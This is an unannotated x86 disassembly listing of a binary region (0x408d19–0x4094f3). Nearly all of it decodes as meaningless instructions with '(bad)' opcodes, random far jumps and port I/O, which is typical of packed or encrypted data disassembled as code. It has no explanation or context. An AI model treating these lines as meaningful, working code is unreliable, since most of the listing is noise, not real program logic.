  408d19:	ror    esi,cl
  408d1b:	repnz cmp BYTE PTR [esi+esi*4-0x4f43f517],0x22
  408d24:	or     al,0x67
  408d26:	in     al,0x8e
  408d28:	cld    
  408d29:	xchg   esp,eax
  408d2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d2b:	adc    al,0x5f
  408d2d:	dec    esp
  408d2e:	addr16 xor al,0x15
  408d31:	xchg   ecx,eax
  408d32:	int3   
  408d33:	and    eax,0x6aac9570
  408d38:	js     0x408d2f
  408d3a:	inc    ebx
  408d3b:	or     al,0xb9
  408d3d:	in     al,dx
  408d3e:	mov    ds:0x1456e00c,eax
  408d43:	ret    0x7e0
  408d46:	not    BYTE PTR [ebx-0x35f53509]
  408d4c:	out    0x75,eax
  408d4e:	mov    al,0x5c
  408d50:	push   esi
  408d51:	cld    
  408d52:	pop    ss
  408d53:	jge    0x408d81
  408d55:	fiadd  WORD PTR [edx-0x1e95b66c]
  408d5b:	xor    eax,ebx
  408d5d:	sbb    al,0x35
  408d5f:	adc    ecx,ecx
  408d61:	xor    DWORD PTR [ebx+0x42d748fa],ebx
  408d67:	fisttp DWORD PTR [ebp-0x74bbc52]
  408d6d:	icebp  
  408d6e:	push   0x788696c2
  408d73:	js     0x408d84
  408d75:	jb     0x408d96
  408d77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d78:	or     cl,BYTE PTR [esi]
  408d7a:	je     0x408d2d
  408d7c:	push   esp
  408d7d:	(bad)  
  408d7f:	cdq    
  408d80:	pop    eax
  408d82:	ror    ecx,1
  408d84:	pushf  
  408d85:	mov    dh,0x94
  408d87:	inc    eax
  408d88:	push   edi
  408d89:	loopne 0x408def
  408d8b:	mov    edi,DWORD PTR [eax+0x70]
  408d8e:	or     DWORD PTR [ebx+eax*8+0x5d],edi
  408d92:	adc    cl,BYTE PTR [edi]
  408d94:	leave  
  408d95:	addr16 xchg edx,eax
  408d97:	add    ebp,DWORD PTR [ebp-0x73]
  408d9a:	out    dx,al
  408d9b:	xor    al,0x1f
  408d9d:	jmp    0x7586d18f
  408da2:	jbe    0x408df2
  408da4:	or     esi,ecx
  408da6:	js     0x408dee
  408da8:	xor    bh,ah
  408daa:	mov    ah,0x2
  408dac:	enter  0x96a0,0xe6
  408db0:	aad    0x7d
  408db2:	mov    eax,ds:0xc926c81c
  408db7:	push   esp
  408db8:	and    bl,BYTE PTR [ebp-0x431a53ee]
  408dbe:	dec    esi
  408dbf:	adc    ch,BYTE PTR [edi-0x66]
  408dc2:	retf   0xa011
  408dc5:	pop    ecx
  408dc6:	dec    eax
  408dc7:	dec    ebp
  408dc8:	adc    BYTE PTR [ebx+0x5],0xb2
  408dcc:	and    al,0xa2
  408dce:	dec    edx
  408dcf:	inc    ebx
  408dd0:	ss aam 0x38
  408dd3:	leave  
  408dd4:	adc    esi,DWORD PTR [edx+0x242f0464]
  408dda:	lea    edi,[eax+0x9]
  408ddd:	jge    0x408dbd
  408ddf:	pop    ds
  408de0:	cmp    DWORD PTR [edx+eiz*4-0x3],edi
  408de4:	out    0x31,al
  408de6:	out    0x9d,eax
  408de8:	(bad)  
  408dea:	in     eax,0x4b
  408dec:	dec    ebp
  408ded:	cwde   
  408dee:	pop    es
  408def:	sar    ch,1
  408df1:	sub    DWORD PTR [eax-0x3a],0x2d
  408df5:	pop    ebx
  408df6:	bound  ecx,QWORD PTR [ebx-0x433574c7]
  408dfc:	popa   
  408dfd:	(bad)  
  408dfe:	das    
  408dff:	xchg   esi,eax
  408e00:	mul    BYTE PTR [eax+0x71]
  408e03:	xor    al,0x2
  408e05:	dec    edi
  408e06:	jp     0x408dae
  408e08:	out    dx,eax
  408e09:	sahf   
  408e0a:	pop    es
  408e0b:	pushf  
  408e0c:	sub    al,BYTE PTR [ecx]
  408e0e:	mov    ebp,0x5707b9d9
  408e13:	data16 arpl WORD PTR [esi],bp
  408e16:	push   ecx
  408e17:	js     0x408e20
  408e19:	adc    esp,ecx
  408e1b:	test   al,0x4a
  408e1d:	test   eax,0x7782a8b6
  408e22:	add    DWORD PTR [ebp-0x5916b4aa],eax
  408e28:	sbb    al,BYTE PTR [eax]
  408e2a:	mov    WORD PTR [edx-0x71],?
  408e2d:	cdq    
  408e2e:	inc    ebx
  408e2f:	mov    cl,0xc4
  408e31:	and    al,0x7e
  408e33:	ins    BYTE PTR es:[edi],dx
  408e34:	shr    BYTE PTR [ebx+0x64b60687],1
  408e3a:	jecxz  0x408e96
  408e3c:	mov    bl,0x4c
  408e3e:	mov    ebp,0xac0f7f5f
  408e43:	rol    BYTE PTR [edx],1
  408e45:	mov    DWORD PTR [ebp+0x14],eax
  408e48:	mov    eax,DWORD PTR [esi]
  408e4a:	xor    DWORD PTR [ebp+0x14],edi
  408e4d:	shr    edx,0x2
  408e50:	mov    edx,DWORD PTR [esi+0x4]
  408e53:	xor    edx,edx
  408e55:	shl    eax,0x1e
  408e58:	or     edx,DWORD PTR [ebp+0x14]
  408e5b:	mov    DWORD PTR [ebp-0x28],edx
  408e5e:	mov    eax,DWORD PTR [ebp-0x24]
  408e61:	mov    eax,DWORD PTR [ebp-0x24]
  408e64:	jmp    0x409242
  408e69:	and    al,BYTE PTR [ebp-0x6d]
  408e6c:	pop    ss
  408e6d:	jb     0x408e35
  408e6f:	and    ah,BYTE PTR ds:0x7e10ec41
  408e75:	pop    ecx
  408e76:	aaa    
  408e77:	mov    cl,0xb0
  408e79:	cmp    dl,BYTE PTR [ecx+0x18]
  408e7c:	sbb    BYTE PTR [esi-0x3ee7e7ee],bl
  408e82:	arpl   WORD PTR [edx+0x31],bp
  408e85:	sub    eax,0x3f03e06c
  408e8a:	mov    esi,0xd57aaa33
  408e8f:	mov    ss,WORD PTR [esi-0x44b353e3]
  408e95:	into   
  408e96:	jb     0x408e7e
  408e98:	xchg   DWORD PTR [ebx],edi
  408e9a:	fdivr  QWORD PTR [eax-0x53c9b801]
  408ea0:	bound  ebp,QWORD PTR [edi-0x59]
  408ea3:	push   ebx
  408ea4:	jl     0x408e77
  408ea6:	dec    esp
  408ea7:	scas   eax,DWORD PTR es:[edi]
  408ea8:	ins    WORD PTR es:[edi],dx
  408eaa:	call   0x6f25ba95
  408eaf:	cmp    esp,esi
  408eb1:	lea    esp,[esi+0x2d]
  408eb4:	xchg   edx,eax
  408eb5:	std    
  408eb6:	retf   0xd10
  408eb9:	scas   al,BYTE PTR es:[edi]
  408eba:	stos   DWORD PTR es:[edi],eax
  408ebb:	cmp    edx,esi
  408ebd:	and    ebp,DWORD PTR [eax]
  408ebf:	(bad)  
  408ec0:	adc    ebx,DWORD PTR ds:0x970b3dc4
  408ec6:	fcomp  QWORD PTR [ebx-0x63a32fa3]
  408ecc:	mov    bh,0xe
  408ece:	mov    eax,ds:0x5078867b
  408ed3:	push   es
  408ed4:	lock and al,BYTE PTR [edx]
  408ed7:	loop   0x408ed5
  408ed9:	cmp    DWORD PTR [ecx],0xde43f117
  408edf:	add    al,0xeb
  408ee1:	adc    esp,edi
  408ee3:	inc    ebx
  408ee4:	jo     0x408e83
  408ee6:	mov    dl,0xe1
  408ee8:	and    dl,al
  408eea:	xchg   ecx,eax
  408eeb:	or     ebx,DWORD PTR [ebx-0x74]
  408eee:	rcl    BYTE PTR [ecx-0x7a96e592],cl
  408ef4:	(bad)  
  408ef5:	pusha  
  408ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ef7:	inc    eax
  408ef8:	shr    BYTE PTR [ebx-0x1e9c67a0],0xd
  408eff:	jecxz  0x408f53
  408f01:	jmp    0xfc17:0x3544af2d
  408f08:	lods   al,BYTE PTR ds:[esi]
  408f09:	retf   0xb12d
  408f0c:	or     ebx,DWORD PTR [edx+ecx*1-0x7b]
  408f10:	div    BYTE PTR [eax]
  408f12:	xchg   esp,eax
  408f13:	add    eax,0x29482439
  408f18:	add    DWORD PTR [edx],ebp
  408f1a:	or     ah,bh
  408f1c:	sbb    DWORD PTR [esi+0x786e6ff3],edx
  408f22:	push   ecx
  408f23:	xchg   esp,eax
  408f24:	les    esi,FWORD PTR [ecx+0x5]
  408f27:	bnd jb 0x408ebb
  408f2a:	aas    
  408f2b:	int    0x89
  408f2d:	(bad)  
  408f2e:	mov    edx,eax
  408f30:	arpl   WORD PTR [esi],ax
  408f32:	(bad)  
  408f33:	ror    BYTE PTR [ebx],cl
  408f35:	xlat   BYTE PTR ds:[ebx]
  408f36:	jb     0x408ef4
  408f38:	lahf   
  408f39:	adc    eax,0x9cf7e4ef
  408f3e:	xchg   ebp,eax
  408f3f:	xchg   esi,eax
  408f40:	sub    DWORD PTR [edi],0xffffffab
  408f43:	push   esp
  408f44:	sub    BYTE PTR [eax],dl
  408f46:	add    esi,ecx
  408f48:	out    0xd1,al
  408f4a:	clc    
  408f4b:	push   ss
  408f4c:	ret    
  408f4d:	push   ebx
  408f4e:	push   esi
  408f4f:	int    0x4
  408f51:	aam    0x21
  408f53:	arpl   WORD PTR [ebx-0x47],cx
  408f56:	(bad)  
  408f57:	mov    ebx,0x8e89ae0e
  408f5c:	aas    
  408f5d:	shl    DWORD PTR [edx+0x2d31b8bc],cl
  408f63:	popa   
  408f64:	test   BYTE PTR [edx-0x1cc88e77],cl
  408f6a:	push   ss
  408f6b:	js     0x408fe6
  408f6d:	xor    dh,ch
  408f6f:	loopne 0x408f7c
  408f71:	mov    ebp,edx
  408f73:	push   0x8f3f4fb9
  408f78:	repz mov ds:0xffde9551,al
  408f7e:	sub    al,0xa2
  408f80:	ins    DWORD PTR es:[edi],dx
  408f81:	or     DWORD PTR [ebp+0x6b14e686],eax
  408f87:	xchg   esi,eax
  408f88:	(bad)  gs:[esi+0x71]
  408f8c:	mov    edx,0x5459c9be
  408f91:	scas   eax,DWORD PTR es:[edi]
  408f92:	enter  0x470c,0x83
  408f96:	ins    BYTE PTR es:[edi],dx
  408f97:	aam    0xeb
  408f99:	call   0x9c42f285
  408f9e:	and    edi,DWORD PTR [eax-0x464e176b]
  408fa4:	(bad)
  408fa7:	xor    esi,ecx
  408fa9:	shr    BYTE PTR [edi],0x60
  408fac:	nop
  408fad:	test   DWORD PTR [esi+ebx*4+0x38],0x62c27d2c
  408fb5:	push   esi
  408fb6:	jmp    0x408f7c
  408fb8:	xor    eax,0xdda00762
  408fbd:	repnz sbb al,0x0
  408fc0:	fdiv   QWORD PTR [ecx]
  408fc2:	mov    edi,0x1c64f117
  408fc7:	ins    BYTE PTR es:[edi],dx
  408fc8:	fst    DWORD PTR [eax-0x56]
  408fcb:	dec    esp
  408fcc:	ds fucomip st,st(7)
  408fcf:	sub    BYTE PTR [esi+0x54],ah
  408fd2:	or     ebx,esp
  408fd4:	cld    
  408fd5:	ror    BYTE PTR [esi+ebp*8-0x53],0xdd
  408fda:	sbb    al,0x72
  408fdc:	mov    ch,0xf8
  408fde:	xchg   BYTE PTR [ecx-0x16b6a039],ah
  408fe4:	cdq    
  408fe5:	mov    edi,0xd30bfc60
  408fea:	lods   eax,DWORD PTR ds:[esi]
  408feb:	ret    
  408fec:	cmp    esi,DWORD PTR [ebp-0x2b3da9c1]
  408ff2:	nop
  408ff3:	in     al,0x1f
  408ff5:	jb     0x408fed
  408ff7:	lds    esp,FWORD PTR [eax+0x450b2211]
  408ffd:	fsub   st(5),st
  408fff:	jbe    0x408feb
  409001:	(bad)  
  409002:	icebp  
  409003:	sub    eax,0xadbfd280
  409008:	mov    bl,0x8
  40900a:	out    0xb7,eax
  40900c:	jp     0x409010
  40900e:	sahf   
  40900f:	jne    0x408fd9
  409011:	mov    BYTE PTR [esi+0x3d],0x48
  409015:	jecxz  0x408ff5
  409017:	loopne 0x408fae
  409019:	into   
  40901a:	aaa    
  40901b:	mov    bh,0x56
  40901d:	jmp    0x409028
  40901f:	cmp    esp,eax
  409021:	cmc    
  409022:	sti    
  409023:	or     eax,esp
  409025:	add    dl,dh
  409027:	or     edi,DWORD PTR [ecx-0x57]
  40902a:	jno    0x409066
  40902c:	inc    edi
  40902d:	and    al,bl
  40902f:	push   0x3a741fc2
  409034:	pusha  
  409035:	popa   
  409036:	ins    DWORD PTR es:[edi],dx
  409037:	cmp    ch,dh
  409039:	sbb    ecx,eax
  40903b:	sbb    cl,BYTE PTR [ebx+0x25f6eb29]
  409041:	mov    ecx,0xd7b77a74
  409046:	stos   DWORD PTR es:[edi],eax
  409047:	mov    dl,0x65
  409049:	into   
  40904a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40904b:	not    DWORD PTR [ebx+ecx*8]
  40904e:	lds    ebx,FWORD PTR [esi]
  409050:	std    
  409051:	cld    
  409052:	lds    ebp,FWORD PTR [eax+0x59077c52]
  409058:	xor    eax,0xe9246c60
  40905d:	mov    BYTE PTR [eax],0x54
  409060:	pop    esi
  409061:	fs pop ebx
  409063:	xlat   BYTE PTR ds:[ebx]
  409064:	dec    ebp
  409065:	les    ebx,FWORD PTR [ecx-0x51]
  409068:	push   esi
  409069:	xchg   ebx,eax
  40906a:	std    
  40906b:	and    al,0x5d
  40906d:	rcl    DWORD PTR [esi],cl
  40906f:	cli    
  409070:	xchg   DWORD PTR es:[edi],edx
  409073:	loope  0x409024
  409075:	test   ax,0x4fe6
  409079:	cs cdq 
  40907b:	stos   BYTE PTR es:[edi],al
  40907c:	cld    
  40907d:	mov    ebp,0xd9445a
  409082:	clc    
  409083:	jecxz  0x40908e
  409085:	shr    BYTE PTR [eax+0x27],1
  409088:	imul   ebp,ebp,0x40
  40908b:	add    DWORD PTR [esi],ecx
  40908d:	jmp    0xbcee:0xb378ca06
  409094:	dec    eax
  409095:	test   al,0xbb
  409097:	fcomp  DWORD PTR [eax]
  409099:	mov    ecx,0x12202514
  40909e:	fcom   st(5)
  4090a0:	adc    DWORD PTR [esp+edx*1+0x7c],edx
  4090a4:	mov    edx,0xd58d0260
  4090a9:	and    dl,BYTE PTR [eax+0x57539c4e]
  4090af:	dec    esp
  4090b0:	dec    eax
  4090b1:	inc    esi
  4090b2:	repnz (bad) 
  4090b4:	das    
  4090b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090b6:	(bad)  
  4090b7:	ror    BYTE PTR [edx-0x72],1
  4090ba:	xchg   esi,eax
  4090bb:	call   0x6431:0x95a0a2fc
  4090c2:	out    dx,eax
  4090c3:	mov    bl,0xd6
  4090c5:	pop    edx
  4090c6:	push   es
  4090c7:	push   ds
  4090c8:	in     eax,0xdf
  4090ca:	jmp    0xe541f07a
  4090cf:	push   DWORD PTR [esi-0x41ba6d23]
  4090d5:	mov    al,ds:0x3e77b362
  4090da:	add    BYTE PTR [eax+0x89e0c0c],cl
  4090e0:	call   0xe931bf97
  4090e5:	ins    DWORD PTR es:[edi],dx
  4090e6:	cmp    eax,0xba004308
  4090eb:	fimul  WORD PTR [ebx+0x2]
  4090ee:	cli    
  4090ef:	gs xchg eax,edx
  4090f2:	mov    BYTE PTR [edx],0x0
  4090f5:	push   esp
  4090f6:	dec    esp
  4090f7:	mov    dh,0x92
  4090f9:	scas   al,BYTE PTR es:[edi]
  4090fa:	mov    WORD PTR [eax+edi*4],?
  4090fd:	or     al,0x82
  4090ff:	inc    esp
  409100:	inc    ecx
  409101:	adc    BYTE PTR [ecx+0x78cbb449],dl
  409107:	in     al,0xe4
  409109:	jne    0x409184
  40910b:	mov    bh,0xeb
  40910d:	mov    dh,0xdd
  40910f:	dec    edx
  409110:	clc    
  409111:	fiadd  DWORD PTR [ecx]
  409113:	rol    DWORD PTR [esi+0x2a765c6a],1
  409119:	add    esi,edx
  40911b:	jg     0x409144
  40911d:	aam    0xdf
  40911f:	call   0xd15e:0xddeb863b
  409126:	das    
  409127:	sub    DWORD PTR [eax+0xc720c5e],ebx
  40912d:	or     eax,0x13f9b1bc
  409132:	je     0x409161
  409134:	rcr    DWORD PTR [ebp+0x42],cl
  409137:	add    al,0xe5
  409139:	test   eax,eax
  40913b:	sbb    al,0xc1
  40913d:	icebp  
  40913e:	inc    esp
  40913f:	mov    dl,0x4c
  409141:	adc    edx,0x30a80071
  409147:	sub    BYTE PTR [esi],ch
  409149:	mov    ds:0x64e50717,eax
  40914e:	fild   WORD PTR [ebp-0x72]
  409151:	inc    eax
  409152:	mov    DWORD PTR [edi+esi*8+0x15],ebx
  409156:	test   eax,0xad034e8a
  40915b:	mov    ds:0xdaea54a8,al
  409160:	cwde   
  409161:	loopne 0x4091aa
  409163:	xor    BYTE PTR cs:[eax-0x10eec225],0x5
  40916b:	inc    ebx
  40916c:	das    
  40916d:	scas   eax,DWORD PTR es:[edi]
  40916e:	gs or  esp,edi
  409171:	imul   esi,DWORD PTR [ebx],0x132340ee
  409177:	imul   DWORD PTR [ebx]
  409179:	(bad)  
  40917a:	out    dx,al
  40917b:	jnp    0x4091d8
  40917d:	bound  esp,QWORD PTR [esi-0x3a040ce4]
  409183:	mov    edi,0x98ffcf62
  409188:	xchg   edi,eax
  409189:	js     0x4091dd
  40918b:	or     bl,bh
  40918d:	xor    bh,bh
  40918f:	aaa    
  409190:	stc    
  409191:	add    eax,0x5114302a
  409196:	or     BYTE PTR [ebp+0x7f8f9000],bh
  40919c:	and    al,0xda
  40919e:	push   edx
  40919f:	and    BYTE PTR [ecx+eiz*8-0x11],ch
  4091a3:	test   BYTE PTR gs:[eax],dh
  4091a6:	mov    ebp,0x1f3b961d
  4091ab:	mov    BYTE PTR [ebx+0x35],dl
  4091ae:	jnp    0x409228
  4091b0:	xchg   esi,eax
  4091b1:	push   esi
  4091b2:	psrad  mm2,QWORD PTR [ebx-0x60]
  4091b6:	pcmpeqw mm3,QWORD PTR ds:0xa96ddc6d
  4091bd:	sbb    al,0x15
  4091bf:	pop    esi
  4091c0:	ja     0x409223
  4091c2:	sti    
  4091c3:	adc    al,0xac
  4091c5:	sar    BYTE PTR [ecx-0x4b8a95c5],cl
  4091cb:	add    DWORD PTR ds:0x8b2c1325,ebp
  4091d1:	cmp    BYTE PTR [esi+0x1bfa6e94],0x1d
  4091d8:	mov    bh,0x1a
  4091da:	call   0xe97cbf2d
  4091df:	test   BYTE PTR [ecx],0xb4
  4091e2:	(bad)  
  4091e4:	xchg   ah,cl
  4091e6:	cmp    dl,ah
  4091e8:	dec    ecx
  4091e9:	aad    0x67
  4091eb:	ins    BYTE PTR es:[edi],dx
  4091ec:	mov    al,0x95
  4091ee:	mov    bl,0x96
  4091f0:	jmp    0x4aeb:0x154778cf
  4091f7:	xchg   ebp,eax
  4091f8:	inc    ebx
  4091f9:	adc    BYTE PTR [eax+0x0],dl
  4091fc:	cmp    ebp,ebp
  4091fe:	ds stos DWORD PTR es:[edi],eax
  409200:	fxch   st(6)
  409202:	stos   BYTE PTR es:[edi],al
  409203:	das    
  409204:	jge    0x40921c
  409206:	in     al,dx
  409207:	call   0x3eea:0x45065ceb
  40920e:	mov    ds:0xf8ed7c4e,eax
  409213:	lods   eax,DWORD PTR ds:[esi]
  409214:	retf   
  409215:	aaa    
  409216:	mov    dl,0x5e
  409218:	pop    eax
  409219:	dec    ebx
  40921a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40921b:	(bad)  
  40921c:	hlt    
  40921d:	in     eax,0xb6
  40921f:	out    0x6f,eax
  409221:	sbb    eax,0x8f3d7970
  409226:	jo     0x40921f
  409228:	inc    ebx
  409229:	sbb    al,BYTE PTR [eax-0x2e664423]
  40922f:	sbb    DWORD PTR [edx+0x2b],edx
  409232:	mov    ch,0x9e
  409234:	mov    ds:0xde18451,eax
  409239:	fadd   QWORD PTR [ecx]
  40923b:	std    
  40923c:	lods   al,BYTE PTR ds:[esi]
  40923d:	pop    ebx
  40923e:	iret   
  40923f:	xlat   BYTE PTR ds:[ebx]
  409240:	aam    0xa9
  409242:	xor    edx,edx
  409244:	shld   edx,eax,0x2
  409248:	xor    edx,ecx
  40924a:	mov    DWORD PTR [ebp+0xc],edx
  40924d:	jmp    0x40962b
  409252:	loop   0x409279
  409254:	es jmp 0x617f:0x1d1aea26
  40925c:	mov    eax,ds:0xb719e870
  409261:	jl     0x409223
  409263:	dec    ecx
  409264:	sbb    BYTE PTR [eax],bl
  409266:	sahf   
  409267:	adc    bl,BYTE PTR [eax]
  409269:	sbb    BYTE PTR [esi-0x20],bh
  40926c:	cwde   
  40926d:	loopne 0x4092e9
  40926f:	stc    
  409270:	aaa    
  409271:	fs je  0x409249
  409274:	mov    dl,0x4a
  409276:	mov    WORD PTR [ecx-0x732206b4],cs
  40927c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40927d:	fnsave [eax+0x36a3a66c]
  409283:	clc    
  409284:	in     eax,dx
  409285:	ret    
  409286:	inc    eax
  409287:	dec    edx
  409288:	aam    0x9b
  40928a:	fcom   QWORD PTR [eax-0x68e2ed29]
  409290:	les    edx,FWORD PTR [eax-0x650094c5]
  409296:	mov    bl,BYTE PTR [esi]
  409298:	jge    0x409230
  40929a:	inc    eax
  40929b:	mov    ah,0x70
  40929d:	outs   dx,DWORD PTR ds:[esi]
  40929e:	pushf  
  40929f:	test   DWORD PTR [ecx+0x43005974],0x3cb93b5a
  4092a9:	icebp  
  4092aa:	es test al,dh
  4092ad:	mov    ebx,0xb81246bc
  4092b2:	or     dl,bl
  4092b4:	add    DWORD PTR [edi],0xfffffffe
  4092b7:	rcl    DWORD PTR [ebx+0x3602daa9],1
  4092bd:	mov    BYTE PTR [edx-0x6b],bh
  4092c0:	push   0x42
  4092c2:	sub    bl,BYTE PTR [edi]
  4092c4:	cmp    bl,BYTE PTR [ecx+0xd]
  4092c7:	nop
  4092c8:	xor    dh,BYTE PTR [edi+0x74]
  4092cb:	jmp    0x40927f
  4092cd:	cmp    BYTE PTR [edi],al
  4092cf:	outs   dx,BYTE PTR ds:[esi]
  4092d0:	(bad)  
  4092d1:	push   ds
  4092d2:	mov    edi,0x84ab006b
  4092d7:	xchg   edx,eax
  4092d8:	in     al,0xec
  4092da:	(bad)  
  4092db:	mov    dl,0xe2
  4092dd:	pop    ecx
  4092de:	ret    0xad18
  4092e1:	sub    al,0x2b
  4092e3:	das    
  4092e4:	jbe    0x40930e
  4092e6:	mov    bl,0x5
  4092e8:	mov    esp,0xe4d1c2b4
  4092ed:	shl    DWORD PTR [edi],0xd9
  4092f0:	lahf   
  4092f1:	rcr    DWORD PTR [edx],cl
  4092f3:	call   0x4d1302c4
  4092f8:	dec    esp
  4092f9:	dec    ebx
  4092fa:	pop    ecx
  4092fb:	retf   0x5588
  4092fe:	and    eax,0x66c213b4
  409303:	retf   0xcd32
  409306:	or     al,0x1e
  409308:	pop    eax
  409309:	inc    ecx
  40930a:	push   esp
  40930b:	and    eax,0x8b28014
  409310:	xor    ch,BYTE PTR es:[ecx]
  409313:	cmp    DWORD PTR [esp+ebx*4+0x37257ec2],esp
  40931a:	mov    bh,0xa5
  40931c:	aam    0xe
  40931e:	in     eax,0x9c
  409320:	add    cl,BYTE PTR ds:0x83eb61d9
  409326:	cld    
  409327:	and    ebp,0x1d
  40932a:	pop    ebx
  40932b:	sti    
  40932c:	je     0x4092e7
  40932e:	ins    BYTE PTR es:[edi],dx
  40932f:	aas    
  409330:	dec    ecx
  409331:	in     eax,dx
  409332:	sbb    eax,0x94f9ec02
  409337:	(bad)
  40933b:	popf   
  40933c:	ds loopne 0x409391
  40933f:	dec    DWORD PTR [ecx+esi*2-0x2f0741f3]
  409346:	add    dh,BYTE PTR [ecx-0x3a]
  409349:	and    al,0x6d
  40934b:	repnz pop edi
  40934d:	and    ebp,ecx
  40934f:	pop    ebx
  409350:	inc    edi
  409351:	outs   dx,BYTE PTR ds:[esi]
  409352:	and    eax,0x20a39fd5
  409357:	aad    0x6c
  409359:	(bad)  
  40935b:	pop    ds
  40935c:	or     BYTE PTR [ecx+ebp*1+0x201ad3fa],0x3
  409364:	cmc    
  409365:	dec    edx
  409366:	mov    esi,0xab711f29
  40936b:	lock lock push ebx
  40936e:	inc    ebx
  40936f:	or     eax,0x948e4745
  409374:	dec    edx
  409375:	adc    DWORD PTR [eax],ebp
  409377:	fcomp  QWORD PTR [eax]
  409379:	inc    ecx
  40937a:	lahf   
  40937b:	je     0x40932c
  40937d:	seta   BYTE PTR [ebx+0x28]
  409381:	ja     0x4093b9
  409383:	fst    DWORD PTR [edx]
  409385:	loopne 0x40935e
  409387:	or     DWORD PTR [eax+0x23],edx
  40938a:	cmp    eax,0x5f5a4b6c
  40938f:	xchg   DWORD PTR [ebx],esi
  409391:	sti    
  409392:	imul   esp,DWORD PTR [ecx-0x58a2f813],0xea35778e
  40939c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40939d:	mov    dh,0x30
  40939f:	add    BYTE PTR [ecx+0x2884e510],ch
  4093a5:	xchg   ebp,eax
  4093a6:	pop    esi
  4093a7:	jbe    0x4093c2
  4093a9:	push   0xdf026b43
  4093ae:	daa    
  4093af:	inc    esi
  4093b0:	inc    edi
  4093b1:	lea    edx,[esi-0x37ebbe96]
  4093b7:	scas   al,BYTE PTR es:[edi]
  4093b8:	pop    edx
  4093b9:	mov    edx,0xaffe7156
  4093be:	repz dec edx
  4093c0:	int3   
  4093c1:	mov    ebx,0xc592da01
  4093c6:	add    dh,al
  4093c8:	sbb    eax,0x76b5c01c
  4093cd:	hlt    
  4093ce:	cmp    al,BYTE PTR [ebp+eiz*4-0x642b8351]
  4093d5:	or     ecx,DWORD PTR [esi+0x7a]
  4093d8:	icebp  
  4093d9:	mov    dh,ch
  4093db:	mul    ebx
  4093dd:	gs test al,0x8c
  4093e0:	sub    eax,0xc7b08912
  4093e5:	cmp    BYTE PTR [edx],bl
  4093e7:	test   DWORD PTR [edi+0x15],esp
  4093ea:	in     al,dx
  4093eb:	(bad)  
  4093ec:	adc    eax,0x90deed03
  4093f1:	jg     0x4093f8
  4093f3:	sub    eax,0x617ec1fa
  4093f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093f9:	jg     0x409400
  4093fb:	icebp  
  4093fc:	jnp    0x40939e
  4093fe:	mov    al,BYTE PTR [eax+0x7c34130b]
  409404:	ret    
  409405:	fcmove st,st(5)
  409407:	mov    esi,eax
  409409:	pop    esp
  40940a:	sahf   
  40940b:	mov    esi,0xd283513c
  409410:	arpl   WORD PTR [edi+esi*4],di
  409413:	pushf  
  409414:	mov    WORD PTR [eax],es
  409416:	and    al,0x79
  409418:	call   0xcc6bd54e
  40941d:	jle    0x409418
  40941f:	inc    esi
  409420:	popa   
  409421:	dec    edx
  409422:	adc    BYTE PTR [esi+eax*8-0x7c],0x2d
  409427:	shr    DWORD PTR [ebp+0x6],cl
  40942a:	in     eax,0x60
  40942c:	push   0xffffffde
  40942e:	cmp    edi,DWORD PTR [eax]
  409430:	mov    al,ds:0xe33c57f5
  409435:	fistp  DWORD PTR [ebp+edi*1+0x1e]
  409439:	mov    ebp,0x4a55768
  40943e:	dec    esi
  40943f:	sub    BYTE PTR [ecx+0x14],bl
  409442:	lahf   
  409443:	fsub   QWORD PTR [esi+0x2c]
  409446:	ins    BYTE PTR es:[edi],dx
  409447:	jmp    0x62faf18f
  40944c:	mov    ds:0x3e790338,eax
  409451:	push   cs
  409452:	jne    0x409496
  409454:	xchg   BYTE PTR [ebp-0x47],dl
  409457:	arpl   sp,di
  409459:	mov    esi,DWORD PTR [ecx+edi*4-0x6f]
  40945d:	pop    es
  40945e:	pop    esp
  40945f:	and    DWORD PTR [eax],ebp
  409461:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409462:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409463:	shr    BYTE PTR [edx-0x4e],cl
  409466:	fstp   DWORD PTR [edi+eax*4-0x1cf066a4]
  40946d:	(bad)  [eax]
  40946f:	add    BYTE PTR [esi+0x13],bh
  409472:	cmp    ah,BYTE PTR [ebp+eiz*8+0x2764f8f5]
  409479:	jg     0x40942c
  40947b:	in     al,dx
  40947c:	popf   
  40947d:	push   ds
  40947e:	inc    ebp
  40947f:	push   ebx
  409480:	stos   BYTE PTR es:[edi],al
  409481:	or     bl,ch
  409483:	inc    eax
  409484:	and    BYTE PTR ds:0x67fa7607,dl
  40948a:	pop    ds
  40948b:	sbb    eax,0x76fbb32c
  409490:	lods   eax,DWORD PTR ds:[esi]
  409491:	adc    bl,ch
  409493:	std    
  409494:	pop    edx
  409495:	shl    DWORD PTR [ebp+0x2b],1
  409498:	mov    esi,0xb791b113
  40949d:	imul   ecx,DWORD PTR [edi],0x61
  4094a0:	jg     0x4094ea
  4094a2:	aaa    
  4094a3:	mov    al,ds:0xd66c15ca
  4094a8:	mov    DWORD PTR [eax-0x66a180e2],esi
  4094ae:	call   0x556e6e9e
  4094b3:	xchg   ecx,eax
  4094b4:	pop    ss
  4094b5:	xchg   DWORD PTR [esi],ebp
  4094b7:	and    ecx,DWORD PTR [ecx-0x5bd26788]
  4094bd:	and    cl,BYTE PTR [edi+0x174d4dcc]
  4094c3:	and    edi,edx
  4094c5:	mov    ah,0x40
  4094c7:	xor    bl,BYTE PTR [edi+0x12d5de94]
  4094cd:	call   0xabe8:0xb1c8da34
  4094d4:	loop   0x4094a3
  4094d6:	xlat   BYTE PTR ds:[ebx]
  4094d7:	iret   
  4094d8:	add    DWORD PTR [ebx],ebp
  4094da:	pop    edx
  4094db:	mov    ds:0x9997c215,eax
  4094e0:	push   ebp
  4094e1:	and    DWORD PTR [eax],edi
  4094e3:	loop   0x40953a
  4094e5:	push   esi
  4094e6:	xchg   esp,eax
  4094e7:	retf   
  4094e8:	fadd   DWORD PTR [edi]
  4094ea:	clc    
  4094eb:	leave  
  4094ec:	lock les ebx,FWORD PTR [ebx-0x3ffd09af]
  4094f3:	jbe    0x40948d
